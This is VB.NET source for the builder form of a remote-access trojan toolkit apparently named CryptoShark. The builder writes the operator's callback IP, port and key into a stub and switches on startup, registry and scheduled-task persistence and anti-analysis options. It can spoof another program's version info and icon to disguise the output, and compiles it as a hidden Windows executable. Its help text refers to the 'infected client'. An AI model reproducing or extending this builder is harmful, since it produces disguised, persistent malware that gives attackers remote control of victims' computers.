
Imports System.Buffers
Imports System.CodeDom.Compiler
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices

Public Class FrmBuilder

    Public iconpath As String
    Public assm As String
    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Assembly", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Assembly", Nothing) = "False" Then
                assm = Nothing
                CheckBox8.Checked = False
            Else
                assm = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Assembly", Nothing)
                CheckBox8.Checked = True
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Icon", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Icon", Nothing) = "False" Then
                iconpath = Nothing
                CheckBox3.Checked = False
                PictureBox1.Image = Nothing
            Else
                iconpath = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Icon", Nothing)
                CheckBox3.Checked = True
                PictureBox1.ImageLocation = (iconpath)
            End If
            Server.Settings()
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Startup", Nothing) = "True" Then
                CheckBox1.Checked = True
            Else
                CheckBox1.Checked = False

            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Reg", Nothing) = "True" Then
                CheckBox2.Checked = True
            Else
                CheckBox2.Checked = False
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Task", Nothing) = "True" Then
                CheckBox5.Checked = True
            Else
                CheckBox5.Checked = False
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Analysis", Nothing) = "True" Then
                CheckBox6.Checked = True
            Else
                CheckBox6.Checked = False
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Host", Nothing) = Nothing Then
                TextBox1.Text = ""
            Else
                TextBox1.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Host", Nothing)
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Port", Nothing) = Nothing Then
                TextBox2.Text = ""
            Else
                TextBox2.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Port", Nothing)
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Key", Nothing) = Nothing Then
                TextBox5.Text = "password"
            Else
                TextBox5.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Key", Nothing)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {
       .Filter = "(executable)|*.exe",
       .OverwritePrompt = False,
       .FileName = ""
         }

            If saveFileDialog.ShowDialog() = DialogResult.OK Then

                Try
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Host", TextBox1.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Port", TextBox2.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Key", TextBox5.Text)


                Catch ex As Exception
                End Try
                Try
                    If CheckBox1.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Startup", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Startup", "False")
                    End If



                    If CheckBox2.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Reg", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Reg", "False")
                    End If



                    If CheckBox5.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Task", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Task", "False")
                    End If

                    If CheckBox6.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Analysis", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Analysis", "False")
                    End If


                    If assm = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Assembly", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Assembly", assm)
                    End If





                    If iconpath = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Icon", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
"Icon", iconpath)
                    End If







                Catch ex As Exception
                End Try

                Dim Source = My.Resources.Stub
                Dim validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
                Dim sb As New StringBuilder()
                Dim rand As New Random()
                For i As Integer = 1 To 16
                    Dim idx As Integer = rand.Next(0, validchars.Length)
                    Dim randomChar As Char = validchars(idx)
                    sb.Append(randomChar)
                Next i

                Dim randomString = sb.ToString()
                Source = Source.Replace("%mtx%", randomString)
                Source = Source.Replace("%ip%", TextBox1.Text)
                Source = Source.Replace("%port%", TextBox2.Text)


                Source = Source.Replace("%key%", TextBox5.Text)



                If CheckBox1.Checked = True Then
                    Source = Replace(Source, "#Const startup = False", "#Const startup = True")
                End If

                If CheckBox5.Checked = True Then
                    Source = Replace(Source, "#Const task = False", "#Const task = True")
                End If

                If CheckBox2.Checked = True Then
                    Source = Replace(Source, "#Const reg = False", "#Const reg = True")
                End If

                If CheckBox6.Checked = True Then
                    Source = Replace(Source, "#Const Analysis = False", "#Const Analysis = True")
                End If



                If CheckBox8.Checked Then
                    Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(assm)


                    Source = Replace(Source, "%Title%", info.FileDescription)
                    Source = Replace(Source, "%Des%", info.Comments)
                    Source = Replace(Source, "%Company%", info.CompanyName)
                    Source = Replace(Source, "%Product%", info.ProductName)
                    Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                    Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", info.FileMajorPart.ToString())
                    Source = Source.Replace("%v2%", info.FileMinorPart.ToString())
                    Source = Source.Replace("%v3%", info.FileBuildPart.ToString())
                    Source = Source.Replace("%v4%", info.FilePrivatePart.ToString())

                Else

                    Source = Replace(Source, "%Title%", Nothing)
                    Source = Replace(Source, "%Des%", Nothing)
                    Source = Replace(Source, "%Company%", Nothing)
                    Source = Replace(Source, "%Product%", Nothing)
                    Source = Replace(Source, "%Copyright%", Nothing)
                    Source = Replace(Source, "%Trademark%", Nothing)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", 1)
                    Source = Source.Replace("%v2%", 0)
                    Source = Source.Replace("%v3%", 0)
                    Source = Source.Replace("%v4%", 0)
                End If

                Compiler(saveFileDialog.FileName, Source)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Public OK As Boolean = False
    Public Sub Compiler(ByVal Path As String, ByVal Code As String)
        Try
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", "v4.0")
            Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
            Dim Parameters As New CompilerParameters
            Dim OP As String = " /target:winexe /platform:anycpu /nowarn"
            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = Path
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .ReferencedAssemblies.Add("System.dll")
                .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                .ReferencedAssemblies.Add("System.Management.dll")
                .ReferencedAssemblies.Add("System.Drawing.dll")
                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
                If Results.Errors.Count > 0 Then
                    For Each E In Results.Errors
                        MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                    Next
                    OK = False
                End If
            End With
            Try
                If CheckBox3.Checked = True Then
                    Threading.Thread.Sleep(1500)
                    IconInjector.InjectIcon(Path, iconpath)
                End If
            Catch ex As Exception
            End Try
            GC.Collect()
            Dim strong2 As String = "Builded"
            Dim long2 As String = " - "
            Dim loat3 As Boolean = Path
            Guna2MessageDialog1.Show(strong2 & long2 & loat3)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs)
        Try
            Dim num As Integer = Conversions.ToInteger(Me.TextBox2.Text)
            If ((Conversions.ToInteger(Me.TextBox2.Text) > &HFFFE) Or (Conversions.ToInteger(Me.TextBox2.Text) < 1)) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch exception1 As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub

    Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs)

    End Sub



    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs)

    End Sub



    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs)
        Try
            If Me.TextBox5.Text.Length > 32 Or ((Me.TextBox5.Text.Length) < 1) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch ex As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub

    Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox3_MouseClick(sender As Object, e As MouseEventArgs)
        If CheckBox3.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = Application.StartupPath & "\Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.EndsWith(".exe") Then
                        iconpath = EXEICO.GetIcon(OfD.FileName)
                        PictureBox1.ImageLocation = (iconpath)
                        GC.Collect()
                    Else
                        iconpath = OfD.FileName
                        PictureBox1.ImageLocation = (iconpath)
                    End If

                Else
                    iconpath = Nothing
                    PictureBox1.Image = Nothing
                    CheckBox3.Checked = False
                End If

            End With


        End If
        If CheckBox3.Checked = False Then
            iconpath = Nothing
            PictureBox1.Image = Nothing
            CheckBox3.Checked = False
        End If
    End Sub

    Private Sub CheckBox8_MouseClick(sender As Object, e As MouseEventArgs)
        If CheckBox8.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assm = OfD.FileName
                    CheckBox8.Checked = True
                Else
                    assm = Nothing
                    CheckBox8.Checked = False
                End If
            End With


        End If
        If CheckBox8.Checked = False Then
            assm = Nothing
            CheckBox8.Checked = False
        End If
    End Sub



    Public Shared Function GetLocalIPAddress() As String
        Dim host = Dns.GetHostEntry(Dns.GetHostName())
        For Each ip In host.AddressList
            If ip.AddressFamily = AddressFamily.InterNetwork Then Return ip.ToString()
        Next
        Throw New Exception("No network adapters with an IPv4 address in the system!")
    End Function


    Private Sub btnLocal_Click(sender As Object, e As EventArgs) Handles btnLocal.Click
        TextBox1.Text = String.Empty
        TextBox1.Text = GetLocalIPAddress()
    End Sub

    Private Sub btnEx_Click(sender As Object, e As EventArgs) Handles btnEx.Click
        TextBox1.Text = String.Empty
        Dim utf8 = New UTF8Encoding()
        Dim webClient = New WebClient()
        Dim externalIp = utf8.GetString(webClient.DownloadData("https://myexternalip.com/raw"))
        TextBox1.Text = externalIp
    End Sub

    Private Sub btnStatic_Click(sender As Object, e As EventArgs) Handles btnStatic.Click
        Dim localIP As String
        Using socket = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0)
            socket.Connect("8.8.8.8", 65530)
            Dim endPoint = TryCast(socket.LocalEndPoint, IPEndPoint)
            localIP = endPoint.Address.ToString()

            TextBox1.Text = String.Empty
            TextBox1.Text = localIP
        End Using
    End Sub

    Private Sub guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles guna2GradientButton1.Click
        TextBox2.Text = "9049"
    End Sub

    Private Sub Guna2CheckBox2_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox8.MouseClick
        If CheckBox8.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assm = OfD.FileName
                    CheckBox8.Checked = True
                Else
                    assm = Nothing
                    CheckBox8.Checked = False
                End If
            End With


        End If
        If CheckBox8.Checked = False Then
            assm = Nothing
            CheckBox8.Checked = False
        End If
    End Sub

    Private Sub CheckBox3_MouseClick_1(sender As Object, e As MouseEventArgs) Handles CheckBox3.MouseClick
        If CheckBox3.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = Application.StartupPath & "\Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.EndsWith(".exe") Then
                        iconpath = EXEICO.GetIcon(OfD.FileName)
                        PictureBox1.ImageLocation = (iconpath)
                        GC.Collect()
                    Else
                        iconpath = OfD.FileName
                        PictureBox1.ImageLocation = (iconpath)
                    End If

                Else
                    iconpath = Nothing
                    PictureBox1.Image = Nothing
                    CheckBox3.Checked = False
                End If

            End With


        End If
        If CheckBox3.Checked = False Then
            iconpath = Nothing
            PictureBox1.Image = Nothing
            CheckBox3.Checked = False
        End If
    End Sub

    ''' <summary>
    ''' The ReleaseCapture.
    ''' </summary>
    <DllImport("user32.DLL", EntryPoint:="ReleaseCapture")>
    Private Shared Sub ReleaseCapture()
    End Sub

    ''' <summary>
    ''' The SendMessage.
    ''' </summary>
    ''' <paramname="hwnd">The hwnd<seecref="IntPtr"/>.</param>
    ''' <paramname="wmsg">The wmsg<seecref="Integer"/>.</param>
    ''' <paramname="wparam">The wparam<seecref="Integer"/>.</param>
    ''' <paramname="lparam">The lparam<seecref="Integer"/>.</param>
    <DllImport("user32.DLL", EntryPoint:="SendMessage")>
    Private Shared Sub SendMessage(ByVal hwnd As IntPtr, ByVal wmsg As Integer, ByVal wparam As Integer, ByVal lparam As Integer)
    End Sub

    ''' <summary>
    ''' The panel1_MouseDown.
    ''' </summary>
    ''' <paramname="sender">The sender<seecref="Object"/>.</param>
    ''' <paramname="e">The e<seecref="MouseEventArgs"/>.</param>


    Private Sub Guna2Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles Guna2Panel2.MouseDown
        ReleaseCapture()
        SendMessage(Handle, &H112, &HF012, 0)
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Guna2MessageDialog1.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning
        Dim fyt As String = "The password must match the password that you entered in the login form If the cell with the password 
is empty you will only receive a connection on the local host 
because this password serves as a stop key between you and the infected client"
        Guna2MessageDialog1.Show(fyt)
    End Sub
End Class